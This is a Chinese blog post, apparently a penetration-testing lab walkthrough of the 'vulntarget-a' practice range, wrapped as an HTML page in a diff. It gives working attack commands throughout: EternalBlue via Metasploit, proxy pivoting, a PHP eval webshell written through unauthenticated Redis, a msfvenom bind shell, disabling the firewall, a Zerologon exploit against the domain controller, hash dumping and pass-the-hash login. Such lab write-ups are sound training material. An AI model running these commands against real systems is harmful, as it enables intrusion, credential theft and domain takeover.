@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>vulntarget-a | vv先生</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://tvvx0.github.io/tvvx.github.io//favicon.ico?v=1688822942699">
+<link rel="stylesheet" href="https://tvvx0.github.io/tvvx.github.io//styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.在扫描端口中发现445端口open还是一个win7系统，存在永恒之蓝漏洞。
+内网主机渗透
+1.启动msf：msfconsole
+2.search type:exploit ms17-010
+use 0
+
+3.设置lhost和rhosts..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://tvvx0.github.io/tvvx.github.io/">
+        <img src="https://tvvx0.github.io/tvvx.github.io//images/avatar.png?v=1688822942699" class="site-logo">
+        <h1 class="site-title">vv先生</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://tvvx0.github.io/tvvx.github.io//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">vulntarget-a</h2>
+            <div class="post-date">2023-07-08</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.在扫描端口中发现445端口open还是一个win7系统，存在永恒之蓝漏洞。</p>
+<h2 id="内网主机渗透">内网主机渗透</h2>
+<p>1.启动msf：msfconsole</p>
+<p>2.search type:exploit ms17-010</p>
+<p>use 0</p>
+<figure data-type="image" tabindex="1"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423222522962.png" alt="image-20230423222522962" loading="lazy"></figure>
+<p>3.设置lhost和rhosts   run</p>
+<figure data-type="image" tabindex="2"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423222647413.png" alt="image-20230423222647413" loading="lazy"></figure>
+<p>4.得到sessions</p>
+<p>退出得到sessions</p>
+<p>shell后进行信息收集</p>
+<figure data-type="image" tabindex="3"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423223014808.png" alt="image-20230423223014808" loading="lazy"></figure>
+<p>ipconfig后发现另一个ip10.0.20.98</p>
+<figure data-type="image" tabindex="4"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423223210581.png" alt="image-20230423223210581" loading="lazy"></figure>
+<h2 id="横向渗透">横向渗透</h2>
+<p>1.添加路由</p>
+<p>use post/multi/manage/autoroute</p>
+<p>set session 2  （上面得到的session的id）</p>
+<p>run</p>
+<figure data-type="image" tabindex="5"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423223626861.png" alt="image-20230423223626861" loading="lazy"></figure>
+<p>2.发现主机</p>
+<p>use post/windows/gather/arp_scanner<br>
+set session 2<br>
+set rhosts 10.0.20.1-254<br>
+run</p>
+<figure data-type="image" tabindex="6"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423223747362.png" alt="image-20230423223747362" loading="lazy"></figure>
+<p>得到另一个主机10.0.20.99</p>
+<p>3.设置代理端口扫描</p>
+<p>用之前的扫描都扫不出开放的端口</p>
+<p>开代理：</p>
+<p>use auxiliary/server/socks_proxy</p>
+<figure data-type="image" tabindex="7"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423224130471.png" alt="image-20230423224130471" loading="lazy"></figure>
+<p>用jobs查看当前是否有任务在执行</p>
+<figure data-type="image" tabindex="8"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423224236306.png" alt="image-20230423224236306" loading="lazy"></figure>
+<p>vim /etc/proxychains4.conf修改配置文件</p>
+<figure data-type="image" tabindex="9"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423224454195.png" alt="image-20230423224454195" loading="lazy"></figure>
+<p>sudo proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</p>
+<p>扫描端口</p>
+<figure data-type="image" tabindex="10"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423224834872.png" alt="image-20230423224834872" loading="lazy"></figure>
+<p>4.火狐设置代理</p>
+<figure data-type="image" tabindex="11"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423225253633.png" alt="image-20230423225253633" loading="lazy"></figure>
+<p>进preferences</p>
+<figure data-type="image" tabindex="12"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423225327890.png" alt="image-20230423225327890" loading="lazy"></figure>
+<p>settings</p>
+<figure data-type="image" tabindex="13"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423225535839.png" alt="image-20230423225535839" loading="lazy"></figure>
+<p>可以访问了</p>
+<figure data-type="image" tabindex="14"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423225639201.png" alt="image-20230423225639201" loading="lazy"></figure>
+<p>对80端口扫描</p>
+<p>python3 dirsearch.py -u &quot;http://10.0.20.99/&quot; --proxy=socks5://127.0.0.1:1080</p>
+<figure data-type="image" tabindex="15"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423234829787.png" alt="image-20230423234829787" loading="lazy"></figure>
+<p>看下phpinfo.php 有phpinfo泄露</p>
+<figure data-type="image" tabindex="16"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230423235010958.png" alt="image-20230423235010958" loading="lazy"></figure>
+<p>在document_root 找到路径C:/phpStudy/PHPTutorial/WWW</p>
+<h2 id="redis未授权访问">Redis未授权访问</h2>
+<p>之前扫出6379 redis服务端口</p>
+<p>配置不当一般主要是两个原理：</p>
+<p>1.配置登录策略导致任意机器都可以登录 redis。<br>
+2.未设置密码或者设置弱口令。</p>
+<p>proxychains redis-cli -h 10.0.20.99</p>
+<figure data-type="image" tabindex="17"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424181556904.png" alt="image-20230424181556904" loading="lazy"></figure>
+<p>连接成功</p>
+<p>1.切换路径</p>
+<p>config set dir C:/phpStudy/PHPTutorial/WWW</p>
+<figure data-type="image" tabindex="18"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424185643224.png" alt="image-20230424185643224" loading="lazy"></figure>
+<p>2.写一句话木码</p>
+<p>config set dbfilename tx.php</p>
+<figure data-type="image" tabindex="19"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424190557283.png" alt="image-20230424190557283" loading="lazy"></figure>
+<p>set tx “<?php @eval($_POST['twx']);?>”</p>
+<figure data-type="image" tabindex="20"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424190742664.png" alt="image-20230424190742664" loading="lazy"></figure>
+<p>save</p>
+<p>3.蚁剑设置代理连接</p>
+<figure data-type="image" tabindex="21"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424210920856.png" alt="image-20230424210920856" loading="lazy"></figure>
+<p>用设置的文件名密码连接</p>
+<figure data-type="image" tabindex="22"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424211208359.png" alt="image-20230424211208359" loading="lazy"></figure>
+<p>打开虚拟终端</p>
+<figure data-type="image" tabindex="23"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424211309083.png" alt="image-20230424211309083" loading="lazy"></figure>
+<p>ipconfig查看系统信息</p>
+<figure data-type="image" tabindex="24"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424211412191.png" alt="image-20230424211412191" loading="lazy"></figure>
+<p>发现10.0.10.111网段</p>
+<figure data-type="image" tabindex="25"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424211515804.png" alt="image-20230424211515804" loading="lazy"></figure>
+<p>权限是system权限</p>
+<h2 id="上传msf后门">上传MSF后门</h2>
+<p>1.生成正向shellcode</p>
+<p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=3333 -f exe &gt;shell.exe</p>
+<p>上传到蚁剑中并在终端执行</p>
+<p>关闭防火墙</p>
+<p>netsh firewall set opmode mode=disable</p>
+<p>2.配置监听器（一定要在设置session那个界面去做）</p>
+<p>use exploit/multi/handler<br>
+set payload windows/x64/meterpreter/bind_tcp<br>
+set lport 3333<br>
+set RHOST 10.0.20.99<br>
+run</p>
+<figure data-type="image" tabindex="26"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424212848014.png" alt="image-20230424212848014" loading="lazy"></figure>
+<p>收集主机信息</p>
+<blockquote>
+<p>sysinfo</p>
+</blockquote>
+<figure data-type="image" tabindex="27"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230424213916509.png" alt="image-20230424213916509" loading="lazy"></figure>
+<p>收集同网段主机</p>
+<p>arp</p>
+<figure data-type="image" tabindex="28"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426185504460.png" alt="image-20230426185504460" loading="lazy"></figure>
+<p>ipconfig /all 收集IP信息</p>
+<figure data-type="image" tabindex="29"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426185801729.png" alt="image-20230426185801729" loading="lazy"></figure>
+<p>vulntarget.com 有域存在</p>
+<p>net group &quot;domain controllers&quot; /domain  查看域控计算机名</p>
+<figure data-type="image" tabindex="30"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426190303653.png" alt="image-20230426190303653" loading="lazy"></figure>
+<p>win2019</p>
+<p>net group “enterprise admins” /domain 查看域管理员</p>
+<figure data-type="image" tabindex="31"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426190446763.png" alt="image-20230426190446763" loading="lazy"></figure>
+<p>Administrator为普通用户，需要提权</p>
+<h2 id="域提权">域提权</h2>
+<p><strong>1、添加路由</strong></p>
+<blockquote>
+<p>run post/multi/manage/autoroute</p>
+</blockquote>
+<figure data-type="image" tabindex="32"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426190644970.png" alt="image-20230426190644970" loading="lazy"></figure>
+<p><strong>2、下载CVE-2020-1472EXP（域内大杀器）</strong></p>
+<p>git clone https://github.com/SecureAuthCorp/impacket<br>
+cd impacket<br>
+python3 -m pip install -r requirements.txt（需要在之前下载pip）<br>
+python3 -m pip install .<br>
+git clone https://github.com/dirkjanm/CVE-2020-1472.git</p>
+<figure data-type="image" tabindex="33"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426223442269.png" alt="image-20230426223442269" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426223506401.png" alt="image-20230426223506401" loading="lazy"></figure>
+<p><strong>3、执行EXP</strong></p>
+<blockquote>
+<p>cd CVE-2020-1472<br>
+proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110</p>
+<figure data-type="image" tabindex="35"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426225959723.png" alt="image-20230426225959723" loading="lazy"></figure>
+</blockquote>
+<p>此时密码已经置空</p>
+<p><strong>4、用secretsdump.py获取域控hash</strong></p>
+<figure data-type="image" tabindex="36"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426230127455.png" alt="image-20230426230127455" loading="lazy"></figure>
+<figure data-type="image" tabindex="37"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426230943458.png" alt="image-20230426230943458" loading="lazy"></figure>
+<p>得到hash</p>
+<p>proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</p>
+<figure data-type="image" tabindex="38"><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20230426231115682.png" alt="image-20230426231115682" loading="lazy"></figure>
+<p>拿下域控</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://tvvx0.github.io/tvvx.github.io/post/hello-gridea/">
+                  <h3 class="post-title">
+                    Hello Gridea
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: [''],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
